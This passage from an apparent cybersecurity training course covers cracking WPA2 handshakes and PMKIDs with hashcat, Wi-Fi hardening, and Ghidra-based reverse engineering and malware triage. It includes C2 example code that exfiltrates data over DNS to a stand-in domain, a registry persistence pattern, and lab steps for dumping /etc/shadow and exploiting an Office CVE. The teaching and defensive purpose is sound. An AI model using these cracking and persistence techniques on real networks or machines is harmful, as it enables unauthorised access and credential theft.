cap2hccapx capture-01.cap hash.hccapx

# Crack with Hashcat:
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
# -m 22000 = WPA-PBKDF2-PMKID+EAPOL (new format)
# -m 2500  = WPA/WPA2 (old format)

# With rules (more coverage):
hashcat -m 22000 hash.hc22000 rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# Check your own password strength — how long would it take?
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d   # 8-digit PIN
# If cracked in seconds → your password is weak!
```

### D.6 PMKID Attack (No Client Needed)

WPA2 has another vulnerability — the AP leaks the PMKID in the first EAPOL frame, and it can be used to attempt password recovery without capturing a full handshake.

```bash
# Install hcxtools:
sudo apt install hcxtools hcxdumptool

# Capture PMKID from your own AP:
sudo hcxdumptool -o pmkid.pcapng -i wlan0mon \
  --filterlist_ap=AA:BB:CC:DD:EE:FF --filtermode=2

# Wait ~30 seconds → Ctrl+C

# Convert to hashcat format:
hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng

# Crack:
hashcat -m 22000 pmkid.hc22000 rockyou.txt
```

### D.7 WPA2 Enterprise — Understanding EAP

WPA2-Enterprise uses a RADIUS server for authentication. Each user has individual credentials.

```
WPA2-Enterprise Flow:
Client → AP → RADIUS Server
         ← EAP Challenge →
         ← EAP Success/Fail →
```

```bash
# Test your own WPA2-Enterprise setup (RADIUS server):
# Install FreeRADIUS:
sudo apt install freeradius

# Test authentication:
radtest username password localhost 0 testing123

# EAP testing with eapol_test:
sudo apt install eapoltest
```

### D.8 Rogue Access Point Detection

```bash
# Detect unauthorized APs on your network:
sudo airodump-ng wlan0mon | grep "YourSSID"
# Multiple entries with same SSID but different BSSID = evil twin

# Automated detection with Kismet:
sudo apt install kismet
sudo kismet
# Web UI at http://localhost:2501
# Shows all APs, clients, anomalies
```

### D.9 Wi-Fi Defense Hardening

```
YOUR HOME/LAB ROUTER HARDENING:
1. Use WPA3 if supported (or WPA2-AES, never TKIP)
2. Set strong passphrase (20+ chars, mix of types)
3. Disable WPS (Wi-Fi Protected Setup — has known vulnerabilities)
4. Use 5GHz band (shorter range = harder to attack from outside)
5. Enable router firewall
6. Disable remote management
7. Update router firmware regularly
8. Use guest network for IoT devices (isolated VLAN)

ENTERPRISE RECOMMENDATIONS:
1. Deploy WPA2/WPA3-Enterprise with EAP-TLS (certificate auth)
2. RADIUS server with strong authentication
3. 802.1X port-based NAC
4. Wireless IDS (Cisco AIR, Aruba RAPIDS)
5. Rogue AP detection
6. Client isolation (prevents client-to-client attacks)
7. Monitor for deauth flood attacks (DoS against Wi-Fi)
```

```bash
# Test your AP's WPS status:
wash -i wlan0mon
# If WPS Locked: No → vulnerable to Pixie Dust attack
# Fix: Disable WPS in router admin panel

# Test password strength:
# Use cracklib:
echo "YourPassword" | cracklib-check
# Or measure entropy:
python3 -c "
import math, string
password = 'YourPasswordHere'
charset = 0
if any(c.islower() for c in password): charset += 26
if any(c.isupper() for c in password): charset += 26
if any(c.isdigit() for c in password): charset += 10
if any(c in string.punctuation for c in password): charset += 32
entropy = len(password) * math.log2(charset) if charset else 0
print(f'Entropy: {entropy:.1f} bits')
print(f'Strength: {[\"Weak\",\"Fair\",\"Good\",\"Strong\",\"Excellent\"][min(int(entropy//25),4)]}')
"
```

---

## Module E: Reverse Engineering with Ghidra

### E.1 What Is Reverse Engineering?

Reverse engineering (RE) is the process of analyzing compiled software to understand its behavior without access to source code. As a cybersecurity professional you use RE to:

- Analyze malware samples
- Find vulnerabilities in closed-source software
- Verify software does what it claims
- Crack license protections (for legally owned software)
- CTF challenges

### E.2 Installing and Setting Up Ghidra

```bash
# Install Java first (required):
sudo apt install default-jdk

# Download Ghidra:
# https://github.com/NationalSecurityAgency/ghidra/releases
wget https://github.com/NationalSecurityAgency/ghidra/releases/download/Ghidra_11.0.3_build/ghidra_11.0.3_PUBLIC_20240410.zip

unzip ghidra_11.0.3_PUBLIC_20240410.zip
cd ghidra_11.0.3_PUBLIC

# Run Ghidra:
./ghidraRun

# Or install via apt on newer Kali:
sudo apt install ghidra
ghidra
```

### E.3 Ghidra Interface Overview

```
GHIDRA WINDOWS:
┌─────────────────────────────────────────────────────────┐
│  Project Manager                                         │
│  ┌──────────┐ ┌────────────────────────────────────────┐│
│  │ Program  │ │          CODE BROWSER                  ││
│  │ Tree     │ │  ┌────────┐ ┌──────────┐ ┌──────────┐ ││
│  │          │ │  │Listing │ │Decompiler│ │Functions │ ││
│  │ Symbols  │ │  │(ASM)   │ │(C-like)  │ │   List   │ ││
│  │          │ │  └────────┘ └──────────┘ └──────────┘ ││
│  └──────────┘ └────────────────────────────────────────┘│
└─────────────────────────────────────────────────────────┘

KEY PANELS:
- Listing: Assembly code (raw disassembly)
- Decompiler: Pseudo-C code (Ghidra's decompiled output)
- Symbol Tree: Functions, imports, exports, labels
- Data Type Manager: Structures, enums
```

### E.4 First Analysis — Simple C Program

Start with something you wrote yourself so you know the answer:

```c
// target.c — compile this, then reverse it
#include <stdio.h>
#include <string.h>

int check_password(char *input) {
    char secret[] = "hunter2";
    if (strcmp(input, secret) == 0) {
        return 1;
    }
    return 0;
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <password>\n", argv[0]);
        return 1;
    }

    if (check_password(argv[1])) {
        printf("Access granted!\n");
    } else {
        printf("Access denied!\n");
    }
    return 0;
}
```

```bash
# Compile (without debug symbols — simulates real-world):
gcc target.c -o target -s   # -s strips symbols

# Run normally:
./target hunter2   # Access granted!
./target wrong     # Access denied!

# Now reverse engineer it:
# 1. Open Ghidra
# 2. New Project → Non-Shared Project → name it
# 3. File → Import File → select 'target'
# 4. Double-click to open in Code Browser
# 5. Yes to auto-analyze
```

**Finding the password in Ghidra:**

```
METHOD 1 — Strings:
Window → Defined Strings
Look for "hunter2" → double-click → jumps to location in code
Follow cross-references to see where it's used

METHOD 2 — Functions:
Symbol Tree → Functions → main
Double-click main → see decompiled output
Look for strcmp call → arguments = password and input

METHOD 3 — Import calls:
Symbol Tree → Imports → strcmp
Right-click → References → Find all references
Jump to strcmp usage → see what's being compared
```

### E.5 Understanding Assembly Basics for RE

You need to read x86/x64 assembly to reverse engineer effectively:

```nasm
; Common x86-64 assembly patterns:

; Function prologue (setup):
push rbp
mov rbp, rsp
sub rsp, 0x20      ; Allocate stack space

; Function epilogue (cleanup):
leave              ; Equivalent to: mov rsp, rbp; pop rbp
ret                ; Return to caller

; Comparison and jump:
cmp eax, 0        ; Compare eax with 0
je  label         ; Jump if equal (ZF=1)
jne label         ; Jump if not equal
jg  label         ; Jump if greater (signed)
jl  label         ; Jump if less (signed)

; Function call:
mov rdi, rax      ; First argument (Linux calling convention)
mov rsi, rbx      ; Second argument
call strcmp       ; Call function

; String operations:
lea rdi, [rbp-0x20]  ; Load address (for char arrays)
mov byte [rbp-0x1], 0x41  ; Store 'A'

; Common patterns:
; if (x == 0) → cmp x, 0 / je
; if (x != 0) → cmp x, 0 / jne
; for loop    → init / cmp / jl body / inc / jmp
```

### E.6 Crackme Exercises

Crackmes are programs specifically designed to be reverse engineered. They're perfect for learning.

```bash
# Find crackmes:
# https://crackmes.one/ — large collection
# https://github.com/leotindall/crackmes — beginner friendly

# Download a beginner crackme and analyze:
# Goal: find the correct password without running the program

# General approach:
# 1. Run 'strings' first:
strings crackme | grep -E "[A-Za-z0-9]{6,}"

# 2. Check for anti-debugging:
ltrace ./crackme   # Library calls
strace ./crackme   # System calls

# 3. Open in Ghidra, find main()
# 4. Find password comparison
# 5. Extract correct password
```

### E.7 Analyzing Real Malware in Ghidra (Safe Lab Exercise)

Use samples from **MalwareBazaar** (only in isolated VM with no network):

```bash
# ONLY in isolated VM (Host-Only networking, no internet):

# Download sample (from your host, then transfer to VM):
# https://bazaar.abuse.ch/browse/

# Initial triage before Ghidra:
file malware.exe
strings malware.exe | grep -E "http|\.exe|reg|HKEY|cmd|powershell"
strings malware.exe | grep -E "\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}"

# Check imports manually:
python3 -c "
import pefile
pe = pefile.PE('malware.exe')
if hasattr(pe, 'DIRECTORY_ENTRY_IMPORT'):
    for entry in pe.DIRECTORY_ENTRY_IMPORT:
        print(f'DLL: {entry.dll.decode()}')
        for imp in entry.imports:
            if imp.name:
                print(f'  {imp.name.decode()}')
"

# In Ghidra — look for:
# 1. Network functions (WSAStartup, connect, send, recv, WinHttpOpen)
# 2. Registry functions (RegOpenKeyEx, RegSetValueEx)
# 3. File operations (CreateFile, WriteFile)
# 4. Process injection (VirtualAllocEx, WriteProcessMemory, CreateRemoteThread)
# 5. Anti-analysis (IsDebuggerPresent, CheckRemoteDebuggerPresent)
# 6. Crypto (CryptEncrypt, CryptDecrypt — ransomware indicator)
```

**Recognizing C2 Communication Patterns:**

```
In Ghidra decompiler output, look for:

// HTTP C2 beacon:
connect(socket, server_addr, ...);
send(socket, "GET /beacon HTTP/1.1\r\nHost: ...", ...);
recv(socket, buffer, ...);   // Waiting for commands

// DNS C2 (data exfil via DNS queries):
DnsQuery_A("data.c2domain.com", ...);  // Encoded data in subdomain

// Registry persistence pattern:
RegOpenKeyEx(HKEY_LOCAL_MACHINE,
    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", ...);
RegSetValueEx(key, "UpdateService", ..., "C:\\malware.exe", ...);
```

### E.8 Scripting Ghidra — Automate Analysis

Ghidra supports Python and Java scripts for automation:

```python
# Ghidra Python script — run via Script Manager (Window → Script Manager)
# Find all calls to suspicious functions:

from ghidra.program.model.listing import *
from ghidra.program.model.symbol import *

suspicious_functions = [
    "CreateRemoteThread",
    "VirtualAllocEx",
    "WriteProcessMemory",
    "IsDebuggerPresent",
    "WSAStartup",
    "RegSetValueEx"
]

def find_suspicious_calls():
    fm = currentProgram.getFunctionManager()

    for func_name in suspicious_functions:
        symbols = getSymbols(func_name, None)
        for sym in symbols:
            refs = getReferencesTo(sym.getAddress())
            for ref in refs:
                caller = fm.getFunctionContaining(ref.getFromAddress())
                if caller:
                    print(f"[!] {func_name} called from: {caller.getName()} at {ref.getFromAddress()}")

find_suspicious_calls()
```

```python
# Find all strings and print with their addresses:
def dump_strings():
    memory = currentProgram.getMemory()
    listing = currentProgram.getListing()

    data_iter = listing.getDefinedData(True)
    for data in data_iter:
        if data.hasStringValue():
            print(f"{data.getAddress()}: {data.getValue()}")

dump_strings()
```

### E.9 Dynamic Analysis Alongside Ghidra

Combine static (Ghidra) with dynamic analysis for best results:

```bash
# GDB — debugger for Linux binaries:
sudo apt install gdb gdb-peda
# PEDA adds extra visualization

# Debug your own compiled binary:
gdb ./target

# GDB commands:
(gdb) info functions           # List all functions
(gdb) break main               # Set breakpoint at main
(gdb) break check_password     # Breakpoint at function
(gdb) run hunter2              # Run with argument
(gdb) next                     # Next line
(gdb) step                     # Step into function
(gdb) print $eax               # Print register
(gdb) x/s $rdi                 # Examine string at address in rdi
(gdb) info registers           # All registers
(gdb) disassemble              # Disassemble current function
(gdb) continue                 # Continue execution
(gdb) quit

# With PEDA — enhanced output:
gdb -q ./target
(gdb) peda                     # Enable PEDA
(gdb) checksec                 # Check security features
```

**x64dbg — Windows debugger (on your Windows VM):**

```
Download: https://x64dbg.com/

Features:
- GUI debugger for Windows
- Plugin ecosystem
- Great for malware analysis
- Scriptable

Workflow:
1. Open executable
2. F2 = toggle breakpoint
3. F7 = step into
4. F8 = step over
5. F9 = run
6. Right-click → Follow in Dump = see memory
```

### E.10 RE Challenges & CTF Practice

```
PLATFORMS FOR RE PRACTICE:
├── picoCTF         → https://picoctf.org/ (beginner, free)
├── CTFtime         → https://ctftime.org/ (live competitions)
├── crackmes.one    → https://crackmes.one/ (dedicated RE)
├── reversing.kr    → http://reversing.kr/ (RE focused)
├── HackTheBox      → https://hackthebox.com (RE category)
└── TryHackMe       → https://tryhackme.com (guided RE rooms)

RECOMMENDED ROOMS ON TRYHACKME:
- "Intro to x86-64"
- "Windows x64 Assembly"
- "Ghidra"
- "REloaded"

TOOLS SUMMARY FOR RE:
├── Static:  Ghidra, IDA Free, Binary Ninja (free tier), Radare2
├── Dynamic: GDB+PEDA (Linux), x64dbg (Windows), WinDbg
├── Both:    Cutter (GUI for Radare2)
└── Scripts: angr (automated binary analysis), pwntools (CTF)
```

---

## Summary — All Five Advanced Modules

| Module                     | Offensive Skills Learned                                                | Defensive Skills Learned                                    |
| -------------------------- | ----------------------------------------------------------------------- | ----------------------------------------------------------- |
| **A: Document Exploits**   | CVE research, macro analysis, Office exploitation                       | Macro policy, ASR rules, patch management                   |
| **B: Crypters/Packers**    | Entropy analysis, packer identification, encoding/encryption            | YARA rules, sandbox detection, static scanning pipeline     |
| **C: Advanced Metasploit** | Privilege escalation, credential dumping, lateral movement, persistence | Detecting pass-the-hash, Mimikatz, persistence hunting      |
| **D: Wi-Fi Security**      | Handshake capture, WPA2 cracking, PMKID attack                          | WPA3 config, strong passwords, WPS disable, enterprise auth |
| **E: Reverse Engineering** | Binary analysis, debugging, malware identification                      | C2 pattern recognition, IOC extraction, behavioral analysis |

---

## Appendix — Lab Exercises Checklist

```
MODULE A:
□ Research CVE-2017-11882 on NVD — understand the vulnerability
□ Install oletools — analyze a test .docm file you create
□ Use searchsploit to find Office-related exploits
□ Test CVE-2017-11882 on your unpatched Windows VM snapshot
□ Apply the patch — verify exploit no longer works

MODULE B:
□ Pack a test binary with UPX
□ Unpack it and verify hash matches original
□ Write entropy_analyzer.py — test on packed vs unpacked binary
□ Run Cuckoo/Any.run sandbox on a test file you create
□ Write a YARA rule for a packer signature

MODULE C:
□ Get Meterpreter session on Metasploitable2
□ Run LinPEAS — document all findings
□ Exploit SUID nmap --interactive to get root
□ Run post/multi/recon/local_exploit_suggester
□ Dump /etc/shadow — crack with John
□ Set up persistence via cron — then detect and remove it

MODULE D:
□ Put your wireless adapter in monitor mode
□ Capture WPA2 handshake from your own router
□ Attempt to crack it — test if your password is strong
□ Run Kismet — document all APs you detect
□ Disable WPS on your router — verify with wash

MODULE E:
□ Compile target.c (with and without -g flag)
□ Load it in Ghidra — find the hardcoded password
□ Set GDB breakpoint at check_password — inspect arguments
□ Download and solve 3 crackmes from crackmes.one
□ Analyze a safe test binary with strings/pefile/Ghidra workflow
```

---

_All exercises are designed for your own isolated lab environment. Always use Host-Only VM networking for attack exercises. Never apply these techniques to systems you do not own._
